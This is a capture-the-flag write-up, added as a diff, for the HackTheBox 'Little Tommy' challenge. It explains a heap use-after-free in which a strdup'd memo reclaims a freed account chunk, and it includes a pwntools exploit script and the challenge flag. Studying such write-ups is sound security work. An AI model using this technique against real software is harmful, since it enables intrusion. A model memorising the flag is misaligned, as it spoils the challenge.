@@ -1,0 +1,79 @@
+<!--Solve date: 06/21/2021-->
+
+<h1>HackTheBox - Little Tommy</h1>
+
+<h2>Binary Exploitation - 40 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>Time and again, we observe that neglecting to clear heap pointers from memory after chunks are freed can result in severe security issues. Perhaps the most common type of use-after-free (UAF) exploitation is type-confusion, where a chunk containing one datatype is freed and subsequently reallocated to hold another data type; without clearing the chunk, an attacker may have access to priviledged fields.</p>
+
+<p>This binary features a relatively simple interface. The user is can create, display, and delete an a account, as well as add a memo and print the flag. Of course, not any user can print the flag - the integer field at offset 0x40 of the account must be equal to a constant (not shown here due to its profanity). The user can create multiple accounts if he or she so wishes, but only one (<code>main_account</code>) is kept track of. After an account is deleted using <code>free()</code>, its pointer is retained in memory and there is absolutely no indication that the account has been deleted.</p>
+
+<h5>Use After Free</h5>
+
+<p>Because the program does not know whether the account has been deleted, it is vulnerable to use-after-free. Specifically, the account chunk, which is now free in the eyes of the memory allocator, can now be used to service another object - the memo. We can write freely to the memo, so in essence, we can control fields of the account (which the program still recognizes!). The memo is generated via <code>strdup</code>, as shown below.</p>
+
+<img src = "./images/htb_little_tommy_1.png"/>
+
+<p>In glibc, <code>strdup</code> is implemented in a straightforward manner; we reproduce the source code [1] below:</p>
+
+<pre class = "c">
+char *
+__strdup (const char *s)
+{
+  size_t len = strlen (s) + 1;
+  void *new = malloc (len);
+
+  if (new == NULL)
+    return NULL;
+
+  return (char *) memcpy (new, s, len);
+}
+</pre>
+
+<p>It simply takes the input argument (which is a string), finds its length using <code>strlen()</code>, adds one to make room for the null-byte terminator, calls <code>malloc()</code> to get memory for the duplicate string, and calls <code>memcpy()</code> to copy over the string plus the null-byte terminator. The important part for us is the fact that it gets memory via <code>malloc()</code>. If we <code>free()</code> the account (which is 0x48 bytes in size, warranting a 0x50-size chunk) and create a memo that is, say, 0x44 bytes in size (not including the null terminator), then we will get the account chunk back, now with control over the protected field.</p>
+
+<p>We simply enter any string of size 0x40 and append the required integer word after. Now we can read the flag.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+from pwn import *
+
+p = remote("206.189.20.127", 30355)
+
+p.recvuntil(b": ")
+p.sendline(b'1')        #create account
+p.recvuntil(b": ")
+p.sendline(b"Kevin")
+p.recvuntil(b": ")
+p.sendline(b"Mitnick")
+
+p.recvuntil(b": ")
+p.sendline(b'3')        #delete account
+
+p.recvuntil(b": ")
+p.sendline(b'4')        #create memo
+p.recvuntil(b":")
+p.sendline(b'A' * 0x40 + b"fuck")
+
+p.recvuntil(b": ")
+p.sendline(b'5')        #print flag
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>HTB{I_am_so_heaped_up_right_now}</code></p>
+
+<h4>References</h4>
+
+<ol>
+    <li><p>Sourceware for 2.27 release, <a href = "https://sourceware.org/git/?p=glibc.git;a=blob;f=string/strdup.c;h=52a38cc2431385ae300d8d4011330fce2668d615;hb=23158b08a0908f381459f273a984c6fd328363cb" target = "_blank"><code>strdup.c</code></a>.</p></li>
+</ol>
